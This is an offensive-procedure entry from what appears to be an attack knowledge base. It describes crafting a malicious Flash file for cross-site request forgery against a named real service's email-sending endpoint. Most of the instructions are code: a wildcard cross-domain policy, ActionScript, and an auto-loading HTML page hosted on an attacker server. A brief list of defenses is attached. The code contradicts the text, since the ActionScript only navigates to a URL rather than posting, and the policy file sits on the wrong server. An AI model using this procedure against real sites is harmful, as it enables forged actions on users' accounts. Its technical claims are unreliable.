---
id: proc-csrf-flash-craft
tags:
  - csrf
  - flash
  - cross-origin
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1203.001]]'
updated_at: '2025-12-14T17:27:15.955Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[T1203.001]]'
---
# Craft-Malicious-Flash-for-CSRF

## Summary

This procedure involves creating a malicious SWF (Flash) file to enable cross-origin requests in a CSRF attack, targeting web applications like Stripo's email testing feature that lack proper XSRF token validation.

## Description

In scenarios where modern browsers enforce strict same-origin policies, legacy Flash files can be used to make cross-domain HTTP requests. The attacker crafts a Flash file with an embedded crossdomain.xml policy allowing access to the target's domain. When loaded in the victim's browser (while authenticated to the target), the Flash initiates a POST request to the vulnerable endpoint without needing the XSRF token. This is particularly effective against endpoints like '/send-test-emails' in Stripo, leading to unauthorized email dispatch.

## Requirements

1. Adobe Flash Professional or open-source alternative like Ming for SWF compilation
2. Control over a web server to host the Flash and crossdomain.xml
3. Victim's browser must support Flash (legacy environments)

## Defense

Defensive measures and detection strategies:

- Implement strict CSRF token validation on all state-changing endpoints
- Disable Flash support in browsers and block legacy plugins
- Monitor for anomalous cross-origin requests via WAF logs

## Objectives

1. Enable cross-origin POST requests from attacker's domain
2. Bypass same-origin policy without JavaScript
3. Prepare for request forgery in subsequent steps

## Instructions

### Step 1: Create Crossdomain Policy

**Context**: Define a policy file allowing the Flash to access the target's domain, placed at the root of the attacker's server.

Create crossdomain.xml:

```xml
<?xml version="1.0"?>
<cross-domain-policy>
  <allow-access-from domain="*" />
</cross-domain-policy>
```

> This file must be accessible at http://attacker.com/crossdomain.xml. Expected output: Policy loads when Flash requests it.

### Step 2: Develop SWF File

**Context**: Compile a simple ActionScript that loads the policy and prepares for request initiation.

Use ActionScript code:

```actionscript
import flash.net.URLRequest;
import flash.net.navigateToURL;

var req:URLRequest = new URLRequest("http://target.com/redirect-endpoint");
navigateToURL(req, "_self");
```

Compile to SWF using Flash IDE or command-line tools.

> Expected output: SWF file (e.g., csrf.swf) that can be embedded in HTML. Test by loading in a Flash-enabled browser.

### Step 3: Embed in Malicious HTML

**Context**: Host an HTML page that auto-loads the SWF to trigger on victim visit.

Create index.html:

```html
<!DOCTYPE html>
<html>
<body>
<object type="application/x-shockwave-flash" data="csrf.swf"></object>
</body>
</html>
```

> Expected output: Page loads Flash silently. Success when Flash executes without console errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[T1203.001]] Exploitation for Client Execution: Flash

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[flash]]
- [[cross-origin]]
